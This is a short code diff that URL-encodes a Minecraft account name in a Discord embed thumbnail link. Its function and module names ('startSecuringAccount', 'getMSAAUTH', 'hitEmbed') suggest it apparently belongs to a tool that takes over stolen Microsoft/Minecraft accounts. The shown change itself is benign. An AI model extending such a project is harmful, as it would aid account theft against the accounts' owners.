@@ -2,6 +2,7 @@ from views.utils.securing.getLiveData import getLiveData
 from views.utils.securing.polishHost import polishHost
 from views.utils.securing.secure import secure
 from views.utils.getMSAAUTH import getMSAAUTH
+from urllib.parse import quote
 from discord import Embed
 import httpx
 import time
@@ -63,7 +64,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     
     if account["method"] != "No Minecraft":
         mcEmbed = Embed()        
-        hitEmbed.set_thumbnail(url=f"https://mc-heads.net/avatar/{str(account['name'])}/128")
+        hitEmbed.set_thumbnail(url=f"https://mc-heads.net/avatar/{quote(account['name'])}/128")
 
     accountData = {
         "hit_embed": hitEmbed,
